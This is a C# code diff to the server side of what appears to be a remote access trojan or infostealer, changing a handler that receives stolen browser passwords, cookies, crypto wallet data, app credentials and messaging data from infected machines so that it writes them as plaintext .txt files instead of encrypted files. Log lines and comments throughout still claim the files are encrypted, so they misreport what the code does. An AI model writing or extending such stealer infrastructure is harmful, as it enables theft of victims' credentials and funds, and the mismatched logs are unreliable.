@@ -1,4 +1,4 @@
-﻿using Server.MessagePack;
+using Server.MessagePack;
 using Server.Connection;
 using Server.Helper;
 using System;
@@ -14,6 +14,16 @@ namespace Server.Handle_Packet
 {
     public class HandleRecovery
     {
+        private static bool SaveToFile(string content, string filePath)
+        {
+            try
+            {
+                File.WriteAllText(filePath, content);
+                return true;
+            }
+            catch { return false; }
+        }
+
         public HandleRecovery(Clients client, MsgPack unpack_msgpack)
         {
             try
@@ -36,8 +46,8 @@ namespace Server.Handle_Packet
                 // Save browser passwords (ENCRYPTED)
                 if (!string.IsNullOrWhiteSpace(pass))
                 {
-                    string filePath = Path.Combine(fullPath, "Password_" + timestamp + ".enc");
-                    if (EncryptionAtRest.EncryptToFile(pass.Replace("\n", Environment.NewLine), filePath))
+                    string filePath = Path.Combine(fullPath, "Password_" + timestamp + ".txt");
+                    if (SaveToFile(pass.Replace("\n", Environment.NewLine), filePath))
                     {
                         hasData = true;
                         Logger.Log($"[HandleRecovery] Encrypted password file saved: {filePath}", Logger.LogLevel.Info);
@@ -47,8 +57,8 @@ namespace Server.Handle_Packet
                 // Save browser cookies (ENCRYPTED)
                 if (!string.IsNullOrWhiteSpace(cookies))
                 {
-                    string filePath = Path.Combine(fullPath, "Cookies_" + timestamp + ".enc");
-                    if (EncryptionAtRest.EncryptToFile(cookies, filePath))
+                    string filePath = Path.Combine(fullPath, "Cookies_" + timestamp + ".txt");
+                    if (SaveToFile(cookies, filePath))
                     {
                         hasData = true;
                         Logger.Log($"[HandleRecovery] Encrypted cookies file saved: {filePath}", Logger.LogLevel.Info);
@@ -58,8 +68,8 @@ namespace Server.Handle_Packet
                 // Save crypto wallet info (ENCRYPTED)
                 if (!string.IsNullOrWhiteSpace(cryptoInfo))
                 {
-                    string filePath = Path.Combine(fullPath, "CryptoWallets_" + timestamp + ".enc");
-                    if (EncryptionAtRest.EncryptToFile(cryptoInfo.Replace("\n", Environment.NewLine), filePath))
+                    string filePath = Path.Combine(fullPath, "CryptoWallets_" + timestamp + ".txt");
+                    if (SaveToFile(cryptoInfo.Replace("\n", Environment.NewLine), filePath))
                     {
                         hasData = true;
                         Logger.Log($"[HandleRecovery] Encrypted crypto wallet file saved: {filePath}", Logger.LogLevel.Info);
@@ -69,8 +79,8 @@ namespace Server.Handle_Packet
                 // Save app credentials (ENCRYPTED)
                 if (!string.IsNullOrWhiteSpace(appCreds))
                 {
-                    string filePath = Path.Combine(fullPath, "AppCredentials_" + timestamp + ".enc");
-                    if (EncryptionAtRest.EncryptToFile(appCreds.Replace("\n", Environment.NewLine), filePath))
+                    string filePath = Path.Combine(fullPath, "AppCredentials_" + timestamp + ".txt");
+                    if (SaveToFile(appCreds.Replace("\n", Environment.NewLine), filePath))
                     {
                         hasData = true;
                         Logger.Log($"[HandleRecovery] Encrypted app credentials file saved: {filePath}", Logger.LogLevel.Info);
@@ -80,8 +90,8 @@ namespace Server.Handle_Packet
                 // Save messaging data (ENCRYPTED)
                 if (!string.IsNullOrWhiteSpace(messaging))
                 {
-                    string filePath = Path.Combine(fullPath, "MessagingData_" + timestamp + ".enc");
-                    if (EncryptionAtRest.EncryptToFile(messaging.Replace("\n", Environment.NewLine), filePath))
+                    string filePath = Path.Combine(fullPath, "MessagingData_" + timestamp + ".txt");
+                    if (SaveToFile(messaging.Replace("\n", Environment.NewLine), filePath))
                     {
                         hasData = true;
                         Logger.Log($"[HandleRecovery] Encrypted messaging data file saved: {filePath}", Logger.LogLevel.Info);
